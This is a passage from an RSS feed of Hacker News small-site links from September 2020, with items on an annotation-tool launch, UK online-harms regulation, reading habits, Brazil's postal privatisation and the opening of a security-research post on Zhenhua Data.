<li>About cognitive bias: check out this beautiful <a href="https://www.visualcapitalist.com/wp-content/uploads/2017/09/cognitive-bias-infographic.html">visual map of cognitive biases</a> or if you like textual data more browse <a href="https://en.wikipedia.org/wiki/List_of_cognitive_biases">the relevant Wikipedia article</a>
The book <a href="https://www.rickhanson.net/books/buddhas-brain/">‘Buddha’s Brain: The Practical Neuroscience of Happiness, Love, and Wisdom.'</a> - I know, such clickbaity title, but trust me, this book is pure gold.</li>
</ul>

      </div></div>]]>
            </description>
            <link>https://ochronus.online/stories-we-tell-ourselves/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24505291</guid>
            <pubDate>Thu, 17 Sep 2020 14:49:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Shutting Down NavHere]]>
            </title>
            <description>
<![CDATA[
Score 53 | Comments 32 (<a href="https://news.ycombinator.com/item?id=24505232">thread link</a>) | @jermaustin1
<br/>
September 17, 2020 | https://jeremyaboyd.com/post/shutting-down-navhere | <a href="https://web.archive.org/web/*/https://jeremyaboyd.com/post/shutting-down-navhere">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://jeremyaboyd.com/post/shutting-down-navhere</link>
            <guid isPermaLink="false">hacker-news-small-sites-24505232</guid>
            <pubDate>Thu, 17 Sep 2020 14:45:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SuperAnnotate Desktop: A better alternative to free annotation tools]]>
            </title>
            <description>
<![CDATA[
Score 30 | Comments 4 (<a href="https://news.ycombinator.com/item?id=24505211">thread link</a>) | @tigranhakobian
<br/>
September 17, 2020 | https://blog.superannotate.com/superannotate-desktop-a-better-alternative-to-free-annotation-tools | <a href="https://web.archive.org/web/*/https://blog.superannotate.com/superannotate-desktop-a-better-alternative-to-free-annotation-tools">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text">
<p><img src="https://blog.superannotate.com/hs-fs/hubfs/SuperAnnotate%20OpenCV%20partnership-1.png?width=1200&amp;name=SuperAnnotate%20OpenCV%20partnership-1.png" alt="SuperAnnotate OpenCV partnership-1" width="1200" srcset="https://blog.superannotate.com/hs-fs/hubfs/SuperAnnotate%20OpenCV%20partnership-1.png?width=600&amp;name=SuperAnnotate%20OpenCV%20partnership-1.png 600w, https://blog.superannotate.com/hs-fs/hubfs/SuperAnnotate%20OpenCV%20partnership-1.png?width=1200&amp;name=SuperAnnotate%20OpenCV%20partnership-1.png 1200w, https://blog.superannotate.com/hs-fs/hubfs/SuperAnnotate%20OpenCV%20partnership-1.png?width=1800&amp;name=SuperAnnotate%20OpenCV%20partnership-1.png 1800w, https://blog.superannotate.com/hs-fs/hubfs/SuperAnnotate%20OpenCV%20partnership-1.png?width=2400&amp;name=SuperAnnotate%20OpenCV%20partnership-1.png 2400w, https://blog.superannotate.com/hs-fs/hubfs/SuperAnnotate%20OpenCV%20partnership-1.png?width=3000&amp;name=SuperAnnotate%20OpenCV%20partnership-1.png 3000w, https://blog.superannotate.com/hs-fs/hubfs/SuperAnnotate%20OpenCV%20partnership-1.png?width=3600&amp;name=SuperAnnotate%20OpenCV%20partnership-1.png 3600w" sizes="(max-width: 1200px) 100vw, 1200px"></p>

<h3><strong>As part of our partnership with OpenCV, we are launching the best free annotation tool for the computer vision community.</strong></h3>

<p><em>In this post, I will be introducing SuperAnnotate’s new free-to-use desktop app, discuss some of the reasons why we built it, and share more about many of the features which we feel will dramatically increase the speed, accuracy, and efficiency of annotation projects. There is a massive functionality gap between free and commercial image annotation tools. SuperAnnotate Desktop is closing this gap by providing the fastest all-inclusive software tool for computer vision engineers to complete their annotation tasks.&nbsp;</em></p>
<!--more-->
<h3><strong><span>Outline</span></strong></h3>
<ul>
<li>The world of free image annotation tools</li>
<li>Introducing SuperAnnotate Desktop </li>
<li>Eight reasons why you should use SuperAnnotate Desktop </li>
<li>Importing annotations from other platforms</li>
<li>The future of SuperAnnotate Desktop</li>
</ul>
<h2><strong>1. The World of Free Image Annotation Tools</strong></h2>
<p>Instead of writing a rather long introduction on the universe of free image annotation tools, I will quickly summarize many of the well-written articles, blogs, and websites covering the topic. Probably the most informative website discussing free tools is <a href="https://awesomeopensource.com/"><span>https://awesomeopensource.com/</span></a>, which ranks open source tools based on the number of&nbsp; GitHub stars each tool has received. The list for image annotation tools can be found<a href="https://awesomeopensource.com/projects/annotation-tool"> <span>here</span></a>. According to the list, it becomes apparent that CVAT (managed by Intel) and VOTT (managed by Microsoft) are among the most popular free tools for image annotation. There are several other interesting articles that include CVAT and VOTT among the best annotation tools available for free. Here are a few examples:<a href="https://bohemian.ai/blog/image-annotation-tools-which-one-pick-2020/"> <span>Bohemian.ai</span></a>,<a href="https://www.sicara.ai/blog/2019-09-01-top-five-open-source-annotation-tools-computer-vision"> <span>Sicara.ai</span></a>,<a href="https://en.wikipedia.org/wiki/List_of_manual_image_annotation_tools"> <span>Wikipedia</span></a>.</p>
<p>These articles are wonderful resources, and I strongly recommend reading them to learn about the different tools available and even try some of them if you have the time. However, what you soon start to realize is that free tools are lacking in many areas resulting in slow speeds, disjointed project management, and an overall non-intuitive user experience - especially when you consider what we’ve come to expect from software today.&nbsp;</p>

<h2><strong>2. </strong><strong>Introducing SuperAnnotate Desktop </strong><strong> </strong></h2>
<p>The founding team of SuperAnnotate (my brother and I) were PhD students in biomedical imaging and computer vision, respectively. During the course of our PhDs, we spent a considerable amount of time working with images, particularly with annotations. In 2018, free annotation tools were as incredibly inconvenient as they are today, and it was quite painful using them. They were not only extremely slow and clunky, but also lacked many key annotation functionalities. These pains led us to launch SuperAnnotate.&nbsp;</p>
<p>Since founding SuperAnntotate, we have always been focused on releasing software that is lightning-fast, easy to use, and extremely functional for all types of computer vision tasks. Over the last two years, we’ve worked hard to build what we think is the fastest and most efficient annotation platform for computer vision pipelines. And, as we came from academia, we also wanted to make a version of our platform easily installable and free for anyone, to help eliminate many of the pains my brother and I faced as PhD students.&nbsp;</p>
<p>Back in June we announced our partnership with OpenCV to bring a free annotation tool to the broader computer vision community that is a significant upgrade over the current free tools available.</p>
<p>A few days ago we released software for <strong>Mac</strong>, <strong>Windows</strong> and <strong>Linux</strong> users. Despite being the initial release, the software already provides multiple advanced features that will accelerate your labeling process by 3–5x.</p>
<p><!--HubSpot Call-to-Action Code --><span id="hs-cta-wrapper-d65647e7-d436-4d5f-831c-82dae9c73cef"><span id="hs-cta-d65647e7-d436-4d5f-831c-82dae9c73cef"><!--[if lte IE 8]><div id="hs-cta-ie-element"></div><![endif]--><a href="https://cta-redirect.hubspot.com/cta/redirect/7839526/d65647e7-d436-4d5f-831c-82dae9c73cef"><img id="hs-cta-img-d65647e7-d436-4d5f-831c-82dae9c73cef" src="https://no-cache.hubspot.com/cta/default/7839526/d65647e7-d436-4d5f-831c-82dae9c73cef.png" alt="Download SuperAnnotate Desktop"></a></span></span><!-- end HubSpot Call-to-Action Code --></p>
<p>We will keep updating our desktop app on a monthly basis and would love to get the community’s feedback on features you all like, as well as the ones that are missing. We’re excited to be a bigger part of the OpenCV community, and to help provide the best computer vision tools to its members.</p>

<p><img src="https://lh3.googleusercontent.com/yWBnNCxg3fqyUsM_kxoSPxZ2ELSDlAGx2q4y_xKmqHYZBBc2IceePuyJbsjzCXyYCDtVm8-66hTbIXoqCS01eJC8RiINmUJqolVcOyu2IBLmFCFPM6t2dG6WgtIzwt397BGsNv9i" width="624" height="391" alt="SuperAnnotate Desktop free annotation tool"></p>

<h2><strong>3. Eight reasons why you should use SuperAnnotate Desktop&nbsp;</strong></h2>
<p>In this section, I will do a deeper dive into some of the features that make our app unique compared to some of the most popular alternatives. As I mentioned above, the paid version of our platform is focused on delivering lightning-fast speed, robust workflows, and a delightful user experience. We tried to bring that focus (and a few of the features) into our desktop app. Here we go:&nbsp;</p>
<p><em>Note: I strongly recommend watching the video below which summarizes all these components.</em></p>

<div data-service="youtube" data-responsive="true"><div><p data-mce-style="position: relative; overflow: hidden; max-width: 100%; padding-bottom: 56.25%; margin: 0px;"><iframe width="480" height="270" src="https://www.youtube.com/embed/_wFYtQY3v14?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" xml="lang" data-mce-src="https://www.youtube.com/embed/_wFYtQY3v14?feature=oembed" data-mce-style="position: absolute; top: 0px; left: 0px; width: 100%; height: 100%; border: none;"></iframe></p></div></div>

<p><strong>3.1 Born out of SuperAnnotate’s Core Platform</strong>&nbsp;—  We’ve spent the last two years and we have invested hundreds of thousands of engineering hours and millions of dollars on the core web version of SuperAnnotate, building what we feel is the fastest and most efficient annotation platform for computer vision. It incorporates feedback from annotators working hundreds of thousands of hours in the web version of our platform as well. This has allowed us to deliver our desktop editor with some of the designs, features, and refinements from our core product offering. We hope the result is a 100% free product that is delightful, feature-rich, and professional grade.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>
<p><strong>3.2 Advanced polygon tool </strong>— Polygon annotation is often the most time-consuming annotation task. Anyone who has tried free annotation tooling knows how poor the experience can be. We made several additions to traditional polygon tools in order to make manual polygon creation and editing much faster. Some of these features include:</p>
<ul>
<li><em>Pen-polygon tool  </em>— use the polygon as a pen making curved annotations much faster</li>
<li><em>Point addition/removal </em>—<em> Add</em> <em>and remove</em> polygon points with just a couple of clicks<strong>&nbsp;</strong></li>
<li><em>Edit polygon</em> —  Substantially increase the speed of editing polygons with our pen polygon tool&nbsp;</li>
<li><em>Share polygon boundaries</em> — draw polygons with shared boundaries 2x faster than traditional tools</li>
<li><em>Polygon move</em><span>/group/delete — select, drag, drop, or delete individual or groups of polygons wherever you want</span></li>
</ul>
These are just some of the features that allow us to reduce polygon annotation times by 20-60% while making polygon annotations significantly more accurate.&nbsp;
<p><strong>3.3 Filtering </strong> —  Most annotation tools lack the ability to filter images. Yet we have found that class filtering has a dramatic impact on speeding up the annotation review process. Through SuperAnnotate’s filtering menu, users can display only images with certain classes they are interested in reviewing, avoiding the need to comb through all of the images and saving tremendous amounts of time.&nbsp;</p>
<p><strong>3.4 Tracking multiple objects between frames</strong> —  Tracking multiple objects between consecutive frames can dramatically improve the annotation experience while also making annotating much faster. Our desktop app allows users to select multiple objects and perform operations such as move, delete, group, copy, paste, and duplicate. Users can copy and duplicate annotations in successive frames while keeping the same attribute ID so that a particular attribute can be tracked through multiple frames easily.&nbsp;</p>
<p><strong>3.5 Huge list of shortcuts</strong> — Gamers and power users of tools like excel and photoshop know how a robust list of shortcuts can both improve the user experience and add considerable speed. That was why we made a huge list of shortcuts for actions like tool selection, on-screen navigation, copy/paste/group/ungroup objects, switching between frames, and others. All shortcuts take place on the left side of the keyboard (similar to gaming), so your right hand can stay focused on the mouse, and your left hand does not have to move while finding the right shortcut.&nbsp;</p>
<p><strong>3.6 Labeling Flexibility</strong>  — Current platforms (both free and paid) limit you to one labeling workflow: you set the attributes and then draw the shapes. Oftentimes, it can be significantly more efficient to have different workflows such as drawing shapes first, or copying classes between instances. With SuperAnnotate, we allow for a wide range of labeling workflows, giving users the flexibility they need to be most efficient.</p>
<p><strong>3.7 Classes/attributes/point labels  </strong>— Creating, adding, or deleting classes and attributes is made very simple in the SuperAnnotate desktop app. Users can easily import classes from previous projects saving the time needed to define projects. In addition, we allow users to annotate individual points with free text. This can have multiple uses such as, describing the object by a sentence, giving a tag to the object, or describing the specific point in the polygon (e.g. rear-right wheel).</p>
<p><strong>3.8 Leveling up your annotations</strong> — As your annotation needs increase, you will likely find yourself looking for things like increased automations, ML features, more robust project management, detailed quality assurance, team collaboration, and user roles. You might also find yourself needing outsourced annotation teams. At SuperAnnotate, we can satisfy all of these needs and much more via our core platform. <span>Our core platform leverages ML and workflow-based features to help computer vision teams increase annotation speed by up to 10x, while dramatically improving the quality of training data and increasing the efficiency of managing annotation projects. We also have integrated services on the platform, giving customers the ability to access thousands of professionally managed outsourced annotators armed with our lightning-fast tooling. If you are interested in learning more about our core platform and services, please fill out </span><a href="https://www.superannotate.com/contacts?utm_source=blog&amp;utm_medium=article&amp;utm_campaign=SuperAnnotate_Desktop_Launch" rel="noopener"><span>this form</span></a><span>.&nbsp;</span></p>

<h2><strong>4. Importing annotations from other platforms or open-source tools</strong></h2>
<p>Migrating to SuperAnnotate from other software is something important to our customers. This was a common request from our users as many of them wanted to use our platform to quality check their previous work and transition over from other tools. We’ve made it super easy to import annotated data from other annotation tools using only a few lines of code, which I’ve described below. Then, once in our platform, users can leverage features described above like filtering and advanced …</p></span></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.superannotate.com/superannotate-desktop-a-better-alternative-to-free-annotation-tools">https://blog.superannotate.com/superannotate-desktop-a-better-alternative-to-free-annotation-tools</a></em></p>]]>
            </description>
            <link>https://blog.superannotate.com/superannotate-desktop-a-better-alternative-to-free-annotation-tools</link>
            <guid isPermaLink="false">hacker-news-small-sites-24505211</guid>
            <pubDate>Thu, 17 Sep 2020 14:43:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[UK government’s plans to regulate the internet are a threat to free speech]]>
            </title>
            <description>
<![CDATA[
Score 231 | Comments 185 (<a href="https://news.ycombinator.com/item?id=24505074">thread link</a>) | @timthorn
<br/>
September 17, 2020 | https://freespeechunion.org/why-the-governments-plans-to-regulate-the-internet-are-a-threat-to-free-speech/ | <a href="https://web.archive.org/web/*/https://freespeechunion.org/why-the-governments-plans-to-regulate-the-internet-are-a-threat-to-free-speech/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-17831" itemtype="https://schema.org/CreativeWork" itemscope="itemscope">

	
	
<div>

	
	<!-- .entry-header -->

	
	<div itemprop="text">

		
		
<p>Dr Radomir Tylecote</p>



<p>September 2020</p>



<p><a href="https://freespeechunion.org/fsu-briefing-online-harms/">Full Report</a><br><a href="https://www.gofundme.com/f/the-free-speech-union-fighting-fund">GoFundMe appeal</a></p>



<figure><div>
<p><iframe title="How the Government’s plans to regulate the internet are a threat to free speech" width="1200" height="675" src="https://www.youtube.com/embed/CQac6mzC444?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
</div></figure>







<h3>The Government’s proposed new internet regulator will infringe free speech</h3>



<p>The Government published the Online Harms White Paper in April 2019 and intends to put a Bill before Parliament next year. The proposals aim to make the UK “the safest place in the world to go online”, but they will seriously infringe free speech.</p>



<p>Some of the harms the White Paper identifies are real, including distributing images of child abuse and online activities by terrorists. But these would be better dealt with by simpler legislation and more resources for law enforcement.</p>



<p>However, some of the harms the White Paper describes are vague, such as “unacceptable content” and “disinformation”. These are not fixed but would be determined by a future regulator. This will lead to sweeping censorship. Online Harms does not even properly define “harm”, so the definition risks being outsourced to activists and lobby groups.</p>



<p>A proposed new regulator will even have the power to censor lawful content: the government says new regulation should prohibit material “that may directly or indirectly cause harm” even if “not necessarily illegal”. The Government also singled out “offensive material”, as if giving offence is a harm the public should be protected from by the state.</p>



<h3>The proposals move the UK towards the internet laws of China, Russia and Belarus</h3>



<p>The Government’s proposals are partly inspired by Germany’s 2017 “NetzDG” internet law, but Human Rights Watch has called for Germany to scrap the law, saying it “turns internet companies into censors”. President Lukashenko of Belarus, Vladimir Putin’s United Russia Party and the Venezuelan government have cited NetzDG as the model for their online laws.</p>



<p>Our government’s plans also bear a worrying similarity to Beijing’s internet censorship policies. Beijing censors “rumours” because they cause “social harms”. Our government’s proposals describe “disinformation” as “harmful”, and will make “content which has been disputed by reputable fact-checking services less visible to users”, forcing companies to promote “authoritative news sources”. This contradicts our government’s claim that “the regulator will not be responsible for policing truth and accuracy online”.</p>



<p>While the authors of the White Paper believe their proposals will mean more “tolerance” and less “hate”, they will likely have the opposite effect, as people respond angrily to censorship and conspiracy theorists enjoy the cachet of being banned by the state.</p>



<p>In this briefing we outline the Government’s Online Harms plans and explain why they are a danger to freedom of speech. Later this year, the Free Speech Union will propose alternative regulation to protect the vulnerable without jeopardising free speech.</p>



<p><a href="https://freespeechunion.org/fsu-briefing-online-harms/">Full Report</a><br><a href="https://www.gofundme.com/f/the-free-speech-union-fighting-fund">GoFundMe appeal</a></p>



<p><em>FSU research papers are designed to promote discussion of free speech issues. As with all FSU publications, the views expressed are those of the author(s) and not those of the FSU, its directors, Advisory Councils or other senior staff.</em></p>

		
		
			</div><!-- .entry-content .clear -->
</div>

	
</article></div>]]>
            </description>
            <link>https://freespeechunion.org/why-the-governments-plans-to-regulate-the-internet-are-a-threat-to-free-speech/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24505074</guid>
            <pubDate>Thu, 17 Sep 2020 14:31:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[It Depresses Me That There Are More Books Than I Can Read in a Lifetime]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24505069">thread link</a>) | @NYCHomosapien
<br/>
September 17, 2020 | https://homosapien.nyc/it-depresses-me-that-there-are-more-books-than-i-could-ever-read-in-a-lifetime/ | <a href="https://web.archive.org/web/*/https://homosapien.nyc/it-depresses-me-that-there-are-more-books-than-i-could-ever-read-in-a-lifetime/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <div>

            <p><a href="https://homosapien.nyc/wp-content/uploads/2020/09/bookshome-scaled.jpg" data-caption=""><img width="696" height="696" src="https://homosapien.nyc/wp-content/uploads/2020/09/bookshome-696x696.jpg" srcset="https://homosapien.nyc/wp-content/uploads/2020/09/bookshome-696x696.jpg 696w, https://homosapien.nyc/wp-content/uploads/2020/09/bookshome-300x300.jpg 300w, https://homosapien.nyc/wp-content/uploads/2020/09/bookshome-1024x1024.jpg 1024w, https://homosapien.nyc/wp-content/uploads/2020/09/bookshome-150x150.jpg 150w, https://homosapien.nyc/wp-content/uploads/2020/09/bookshome-768x768.jpg 768w, https://homosapien.nyc/wp-content/uploads/2020/09/bookshome-1536x1536.jpg 1536w, https://homosapien.nyc/wp-content/uploads/2020/09/bookshome-2048x2048.jpg 2048w, https://homosapien.nyc/wp-content/uploads/2020/09/bookshome-1068x1068.jpg 1068w, https://homosapien.nyc/wp-content/uploads/2020/09/bookshome-1920x1920.jpg 1920w, https://homosapien.nyc/wp-content/uploads/2020/09/bookshome-420x420.jpg 420w" sizes="(max-width: 696px) 100vw, 696px" alt="" title="bookshome" data-srcset="https://homosapien.nyc/wp-content/uploads/2020/09/bookshome-696x696.jpg 696w, https://homosapien.nyc/wp-content/uploads/2020/09/bookshome-300x300.jpg 300w, https://homosapien.nyc/wp-content/uploads/2020/09/bookshome-1024x1024.jpg 1024w, https://homosapien.nyc/wp-content/uploads/2020/09/bookshome-150x150.jpg 150w, https://homosapien.nyc/wp-content/uploads/2020/09/bookshome-768x768.jpg 768w, https://homosapien.nyc/wp-content/uploads/2020/09/bookshome-1536x1536.jpg 1536w, https://homosapien.nyc/wp-content/uploads/2020/09/bookshome-2048x2048.jpg 2048w, https://homosapien.nyc/wp-content/uploads/2020/09/bookshome-1068x1068.jpg 1068w, https://homosapien.nyc/wp-content/uploads/2020/09/bookshome-1920x1920.jpg 1920w, https://homosapien.nyc/wp-content/uploads/2020/09/bookshome-420x420.jpg 420w" data-src="https://homosapien.nyc/wp-content/uploads/2020/09/bookshome-696x696.jpg" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a></p>            </div>

            
<p>Within the past few years I’ve really ramped up the number of books I’ve read. There was a lull after university where I had just finished four years worth of studying and wanted nothing more just to relax, but the demands of starting a new career and moving to a new city kept me more busy than ever. During the evenings of the first couple years of my first job I spent them working towards qualifications that I needed to advance in my field. This bled into the weekend, and I found myself with little time to do much else.</p>



<p>But then I finished all that. Suddenly, outside of the occasional late day at the office, I had a lot of free time outside my 9-5. I spent a lot of time just sitting on Reddit and YouTube. Way too much time. It was a bit ridiculous, to be honest – I live in New York City and had every opportunity at my fingertips. Once I realized this, I started readapting my habits to things that I actually enjoyed. The first novel that I read (and probably the first I had read voluntarily in years) was George Orwell’s 1984. I was inspired to read it based on the current events of the world, and found it ominously on point.</p>



<p>I find it curious how so many people are anti-ebook for reasons like “real books are just better!”. Ironically a significant portion of people sharing this opinion that I’ve spoken to struggle to name the last real book that they read. I say this lovingly, as I was absolutely one of those people. One day while walking through the SoHo Amazon 4-Star store, I bought a Kindle Oasis on a whim. It was close to my birthday and I thought it might be easier to haul around with me through the city and on the subway. For once, an impulse purchase was the right choice. I now bring my Kindle everywhere I with a full with a library the width of a single book and a fifth of the thickness.&nbsp;</p>



<p>Between the discounted $2 books from Amazon’s daily newsletters and the Libby service through the New York Public Library, I always have a story on the go. I downloaded Kurt Vonnegut’s Slaughterhouse Five before a long flight and was immersed until I landed. Periodically I receive a push notification from Libby on my phone letting me know the high demand book I put on hold two weeks ago is available to borrow – usually requiring me to hit the “deliver later” button because I’m already engulfed in something else.</p>



<p>Herein lies the subject of this post. As the books build up and the GoodReads wishlist expands, I’m finding myself more distraught about when am I ever going read all these books! I was forced to send a large chunk of my physical books to Goodwill when I moved into a cramped NY studio apartment, but I still have a couple shelves worth of books bought years ago that still have perfect spines from never being open.&nbsp;</p>



<p>Most of the books I’ve read lately can be found on those listicles of “250 of the Best Classic/Modern/Fiction/Whatever Books” you see online. Even if I were to read a book a week, it would be years before there weren’t any titles left that people would say “I can’t believe you haven’t read _____!” to me. And while reading all those books, there would be at least a few books to enter the public zeitgeist that everyone was talking about while I was reading the classics. I haven’t yet read The Catcher in the Rye, a book that has been on my reading list for years, and who knows when I’ll get to it.</p>



<p>One of my favorite parts about finishing a book is getting to join in on the discussions on Reddit, Goodreads or even in person in the rare case. It’s like getting into an exclusive club, if you’re like me an avoid spoilers at all costs before reading or watching something new. While it’s always nice to have some of my opinions reaffirmed by others, it’s also interesting to see situations where I totally despised a character that apparently everyone else loved and vice versa. Adding to distress is knowing there are countless threads and discussions that I will avoid until the end of time solely because I’ll never read the books in their title.</p>



<p>I enjoy reading books because it’s rewarding. It feels like a much more productive hobby than aimlessly refreshing social media or doom scrolling through the news. It’s an escape from everyday life and it’s amazing how words on a page can evoke emotions in you as you connect with characters and settings. I’ve been forced to consider perspectives or situations that I would never come across in real life and I feel like a more well rounded person for it. I’m sad to think about all the “unknown unknowns” that exist in the minds of the world’s greatest authors which I’ll never be exposed to.&nbsp;</p>



<p>There are worse problems in the world to have. But it’s still something that irks me each time I finish a book and start scrolling through my Kindle library for the next one. Even if I were to quit my job and laze at the beach reading all day, I’d hardly put a dent in the vast expanse of available literature before I went broke or dried up into a raisin in the sun. I’m writing this to look back on. I’m writing this so that the next time I find myself an hour into a YouTube hole I might consider jumping back into my current read instead. I’m writing this to make a positive change in behavior, however slight, and appreciate the free time I do have to read books that much more.</p>
        </div></div>]]>
            </description>
            <link>https://homosapien.nyc/it-depresses-me-that-there-are-more-books-than-i-could-ever-read-in-a-lifetime/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24505069</guid>
            <pubDate>Thu, 17 Sep 2020 14:31:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Amazon and Alibaba in talks to buy the Brazilian Postal Service]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24505048">thread link</a>) | @reese_john
<br/>
September 17, 2020 | https://labsnews.com/en/news/business/amazon-vs-alibaba-the-global-giants-could-fight-for-the-brazilian-post-office-in-case-of-privatization/ | <a href="https://web.archive.org/web/*/https://labsnews.com/en/news/business/amazon-vs-alibaba-the-global-giants-could-fight-for-the-brazilian-post-office-in-case-of-privatization/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
					
<p>The intent of the <a href="https://labsnews.com/en/keywords/brazil/">Brazilian</a> President, Jair Bolsonaro, of privatizing the Brazilian post office is known for a while now. But if it was looking like just a far away idea until some weeks ago, could be closer than ever to get out of the paper after the nomination of a new president for the Correios last week. </p>



<p>Understand the whole story about the change of presidency in Correios:</p>



<ul><li>“<a href="https://labsnews.com/en/ecommerce/correios-president-exits-the-organization/">Correio’s President exits the organization</a>“</li><li>“<a href="https://labsnews.com/en/economy/bolsonaro-announces-new-correios-president/">Bolsonaro announces new Correio’s president</a>“</li></ul>



<p>While the ex-president didn’t agree with the privatization idea, the General Floriano Peixoto, the new president in charge of the Brazilian post office, is more opened to the possibility, and that’s what is keeping Amazon and <a href="https://labsnews.com/en/articles/business/why-the-nine-year-rise-of-aliexpress-means-big-plans-for-latin-american-ecommerce/">Alibaba’s</a> attention. </p>



<p>According to the Brazilian news site O Dia, the global giants are already studying the possibility to buy the Correios if it really happens someday.  The main reason for the two companies is very simple: <strong>to improve logistics in Brazil</strong>. </p>



<p>Since the companies are not interested in the postal service offered by Correios, another possibility on the table is that they could buy it in a partnership with some national bank, according to O Dia. </p>



<p>The end of this story we cannot know for now, but an important new chapter for cross-border e-commerce in Brazil can be just about to begin. </p>



<p>Know more about Amazon and AliExpress in Brazil: </p>



<ul><li>“<a href="https://labsnews.com/en/ebanx-dashboard/what-makes-amazon-amazon-unraveling-the-secret-of-the-ecommerce-giant/">What Makes Amazon… Amazon? Unraveling the Secret of the Ecommerce Giant</a>“</li><li>“<a href="https://labsnews.com/en/ecommerce/how-aliexpress-became-brazils-largest-ecommerce-store/">How AliExpress Became Brazil’s Largest Ecommerce Store</a>“</li></ul>
				</div></div>]]>
            </description>
            <link>https://labsnews.com/en/news/business/amazon-vs-alibaba-the-global-giants-could-fight-for-the-brazilian-post-office-in-case-of-privatization/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24505048</guid>
            <pubDate>Thu, 17 Sep 2020 14:29:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An Inside Look at Zhenhua Data, a Chinese Data Collection and Intelligence Firm]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24504951">thread link</a>) | @yashkadakia
<br/>
September 17, 2020 | https://shadowmap.com/security-research/investigating-chinese-intelligence-firm-zhenhua-data/ | <a href="https://web.archive.org/web/*/https://shadowmap.com/security-research/investigating-chinese-intelligence-firm-zhenhua-data/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>
<p><span><img src="https://shadowmap.com/wp-content/uploads/2020/09/Zhenhua-Data-Internet-Big-Data-Military-Intelligence-System.png" alt="Zhenhua Data Internet Big Data Military Intelligence System" title="Zhenhua Data Internet Big Data Military Intelligence System" srcset="https://shadowmap.com/wp-content/uploads/2020/09/Zhenhua-Data-Internet-Big-Data-Military-Intelligence-System.png 1924w, https://shadowmap.com/wp-content/uploads/2020/09/Zhenhua-Data-Internet-Big-Data-Military-Intelligence-System-1280x651.png 1280w, https://shadowmap.com/wp-content/uploads/2020/09/Zhenhua-Data-Internet-Big-Data-Military-Intelligence-System-980x499.png 980w, https://shadowmap.com/wp-content/uploads/2020/09/Zhenhua-Data-Internet-Big-Data-Military-Intelligence-System-480x244.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) and (max-width: 980px) 980px, (min-width: 981px) and (max-width: 1280px) 1280px, (min-width: 1281px) 1924px, 100vw"></span></p><div>
<p><h4>Investigating Chinese Intelligence Firm Zhenhua Data</h4></p></div></div><div>
<div>
<div><p>Sign up for our Security Research Newsletter to be the first to know about our latest research publications.</p></div></div></div></div><div>
<div>
<div>
<p>Stories of Chinese Intelligence Firms leveraging <a href="https://papers.ssrn.com/sol3/papers.cfm?abstract_id=3691999">Big Data Analysis</a>, <a href="https://www.theatlantic.com/politics/archive/2019/08/inside-us-china-espionage-war/595747/">Social Media Platforms</a>, <a href="https://www.bbc.com/news/world-asia-53544505">LinkedIn, </a><a href="https://www.theatlantic.com/magazine/archive/2020/09/china-ai-surveillance/614197/">Mobile Devices</a>, <a href="https://www.uscc.gov/sites/default/files/2019-11/Chapter%202,%20Section%203%20-%20China's%20Intelligence%20Services%20and%20Espionage%20Threats%20to%20the%20United%20States.pdf">SIGINT, </a>etc are all over the internet.&nbsp; However the recent stories about the Zhenhua Data Leak in the <a href="https://indianexpress.com/article/express-exclusive/china-watching-big-data-president-kovind-pm-narendra-modi-opposition-leaders-chief-justice-of-india-zhenhua-data-information-technology-6594861/">Indian Express</a> caught our attention and we decided to leverage our ShadowMap platform to get some more insight on the Zhenhua Data operation.</p>
<p>After spending several days deep into this rabbit hole of vague corporations, a wide range of collection systems, some really interesting correlation use-cases – we’ve been able to put together a fairly comprehensive image of the Zhenhua Data operation.</p>
<p>While on the surface Zhenhua Data seems to be “just another” firm capturing, processing and selling publicly available information, the story changes rapidly once you look beyond the surface.</p>
<p>This blog post covers four key sections: <strong>Data Collection</strong>, <strong>Data Correlation</strong>, <strong>Identified</strong> <strong>Targets</strong>, <strong>Conclusion.</strong></p>
<h3>Zhenhua Data &amp; Affiliates</h3>
<p>According to the Zhenhua Data website (which has been taken offline, but is still accessible via ShadowMap) – “Zhenhua Data focuses on integrating overseas data and information to provide services for domestic institutions”. In-addition to Shenzhen Zhenhua Data Information Technology Co., Ltd. (china-revival.com) that has already received wide-spread coverage, we also found the involvement of Weiju (aggso.com) &amp; SocialDataMax (socialdatamax.com).</p>
<p>Weiju, started out as a “location-based, instant messaging application that enables users to chat with nearby strangers.”, however the last update on its website (in 2015) mentions “Public opinion monitoring and early warning”, “Communication analysis statistics”, etc.</p>
